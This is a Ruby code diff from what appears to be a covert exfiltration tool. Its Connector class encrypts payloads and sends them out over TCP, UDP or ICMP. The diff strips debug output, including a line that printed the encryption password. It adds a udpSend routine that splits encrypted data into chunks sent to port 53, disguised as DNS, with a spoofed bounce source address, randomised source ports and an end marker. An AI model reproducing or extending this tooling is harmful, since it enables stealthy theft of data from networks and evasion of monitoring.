@@ -29,7 +29,6 @@ class Connector
     @iface = iface
     @connection = connection
     @addr = addr
-    puts pass
     @cipher = Encrypter.new(pass)
     @server = server
     @port = port
@@ -45,13 +44,8 @@ class Connector
 
   def exfilSend(payload)
     iv = @cipher.newIv
-    puts iv
-    puts iv.length
     data = @cipher.encrypt(iv,payload)
-    puts data
-    puts data.length
     payload = iv + data
-    puts payload
     case @connection
       when "tcp"
         tcpSend(payload)
@@ -68,11 +62,6 @@ class Connector
   def exfilRecv(payload)
     iv = payload[0,16]
     data = payload[16..-1]
-    puts iv
-    puts iv.length
-    puts data
-    puts iv + data
-    puts data.length
     result = @cipher.decrypt(iv, payload)
     return result
   end
@@ -181,12 +170,29 @@ class Connector
     tcp_pkt.ip_daddr = $tcpBounceIp
     tcp_pkt.recalc
     tcp_pkt.to_w(@iface)
-	tcp_pkt.to_f("output")
     puts "finished tx"
   end
 
   def udpSend(payload)
-    #udp_pkt = UDPPacket.new(:config => $config, :udp_src => 21423, :udp_dst => 53)
+    begin
+      udp_pkt = UDPPacket.new(:config => $config, :udp_src => 21423, :udp_dst => 53)
+      udp_pkt.eth_daddr = $destMac
+      udp_pkt.udp_dst = 53
+      udp_pkt.udp_src = rand(33) + 12000
+      udp_pkt.ip_saddr = $tcpBounceIp
+      udp_pkt.ip_daddr = @addr
+      udp_pkt.payload = payload[0..1000]
+      if payload.length > 1000
+        payload = payload[1000..-1]
+        udp_pkt.recalc
+        udp_pkt.to_w
+      else
+        udp_pkt.udp_src = 12033
+        udp_pkt.recalc
+        udp_pkt.to_w
+        return
+      end
+    end while (payload.length > 1)
   end
 
   def icmpSend(payload)
